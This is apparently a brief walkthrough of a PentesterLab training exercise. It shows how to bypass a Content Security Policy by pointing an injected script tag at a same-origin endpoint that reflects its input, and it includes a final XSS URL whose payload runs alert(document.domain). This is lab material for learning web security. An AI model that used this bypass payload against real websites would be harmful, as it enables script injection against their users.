Content Security Policy:
Content Security Policy (CSP) is a way to limit the impact of a Cross-Site Scripting (amongst other things).

http://website.so/?name=hacker
Lets say you put where you thought the XSS would go, looking at the page source you receive the following error:

Refused to execute inline script because it violates the following Content Security Policy directive: 
"script-src 'self' https://website.com". Either the 'unsafe-inline' keyword, a hash 
('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable 
inline execution.

Quickly access the CSP policy by using curl
curl http:/server/?name=hacker -o /dev/null --dump-header - 

The header you are looking for is:
Content-Security-Policy: default-src 'self'; script-src 'self' https://server.com

Since "unsafe-inline" is not enabled we cannot use a simple payload like <script>[CODE]</script>

In the source code of the page we see that another page is being called by some javascript:

     </div>
      <div class="container">
        <div class="body-content">

<script src="/js/countdown.php?end=2534926825"></script>             <-- THE INTERESTING LINE
<div class="row">
  <div class="col-lg-12">
    <h1>Content Security Policy</h1>
      <p>Welcome to the <a href="https://pentesterlab.com/">PentesterLab</a>'s exercise on Content Security Policy.</p>
      <p>The objective of this exercise is to find a way to get the victim to visit a link that will create an alert box with your UUID</p>
      <h3>Hello hacker
      Demo countdown: <p id="demo"></p> 


Final URL:
http://website.so/?name= <script%20src="/js/countdown.php?end=alert(document.domain)"></script>

<script>alert('0f02ac89-0f55-4be9-8da9-5f253059235e')</script>